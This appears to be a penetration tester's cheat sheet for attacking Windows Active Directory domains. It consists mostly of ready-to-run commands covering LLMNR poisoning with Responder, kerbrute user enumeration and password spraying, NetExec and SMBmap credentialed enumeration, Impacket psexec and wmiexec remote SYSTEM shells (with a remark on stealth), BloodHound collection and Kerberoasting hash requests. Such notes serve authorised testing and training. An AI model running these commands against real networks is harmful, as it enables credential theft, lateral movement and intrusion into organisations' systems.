## External recon
https://github.com/trufflesecurity/truffleHog

https://buckets.grayhatwarfare.com/

https://whois.domaintools.com/

https://viewdns.info/

http://he.net/

https://github.com/initstring/linkedin2username

https://dehashed.com/

nslookup

## Initial enumeration of the domain

Wireshark

https://linux.die.net/man/8/tcpdump

https://github.com/DanMcInerney/net-creds

https://www.netminer.com/en/product/netminer.php

https://github.com/lgandx/Responder-Windows

https://fping.org/

Nmap

responder -I `interface` -A

sudo nmap -v -A -iL `hostlist` -oN `outputfile`

**Identifying users**

https://github.com/ropnop/kerbrute

https://github.com/insidetrust/statistically-likely-usernames

kerbrute userenum -d `domain` --dc `dc-ip` `userlist` -o `output-file`

## LLMNR & NBT-NS poisoning

https://hashcat.net/hashcat/

https://www.openwall.com/john/

https://github.com/lgandx/Responder

https://github.com/Kevin-Robertson/Inveigh

responder -I `interface`

## Enumerating users for password spraying

### Enumerating password policy

**SMB null session**

https://labs.portcullis.co.uk/tools/enum4linux/

https://github.com/cddmp/enum4linux-ng

enum4linux -P `ip`

enum4linux-ng -P `ip` -oA `filename`

**LDAP anonymous bind**

https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/anonymous-ldap-operations-active-directory-disabled

https://linux.die.net/man/1/ldapsearch

ldapsearch -h `ip` -x -b "DC=`domain`" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

###  Detailed User Enumeration

https://github.com/initstring/linkedin2username

**SMB null session**

https://github.com/ropnop/windapsearch

rpcclient -U "" -N `ip`

rpcclient > enumdomusers

./windapsearch.py --dc-ip `ip` -u "" -U

## Password spraying

**Internal password spraying**

kerbrute passwordspray -d `domain` --dc `ip` `userfile`  `password`

## Enumerating Security Controls

https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps&viewFallbackFrom=win10-ps

**Windows Defender**

Get-MpComputerStatus

## Credentialed Enumeration

**NetExec**

nxc smb 192.168.1.0/24 -u '`username`' -p '`password`' --`option`

**SMBmap**

smbmap -u `username` -p `password` -d `domain`-H `ip`

**RPCClient**

rpcclient `username`@`domain` `ip`

rpcclient $> queryuser `RID`

**Impacket**

***psexec.py***

The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. Once established, it's providing an interactive remote shell as SYSTEM on the victim host.

psexec.py `domain`/`username`:'`password`'@`ip`  

***wmiexec.py***

The tool utilizes a semi-interactive shell, that generates fewer logs than other modules. This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems.

wmiexec.py `domain`/`username`:'`password`'@`ip`  

**Windapsearch**

python3 windapsearch.py --dc-ip `ip` -u `username`@`domain` -p `password` --da

**Bloodhound.py**

https://github.com/dirkjanm/BloodHound.py

https://github.com/BloodHoundAD/BloodHound/releases

sudo bloodhound-python -u '`username`' -p '`password`' -ns `ip` -d `domain` -c all

nxc ldap `ip` -u `isername` -p `password` --bloodhound --collection All

## Kerberoasting

**GetUserSPNs.py**

sudo python3 -m pip install .

GetUserSPNs.py -dc-ip `ip` `domain`/`username` -request -outputfile `filename`
GetUserSPNs.py -dc-ip `ip` `domain`/`username` -request-user `username`
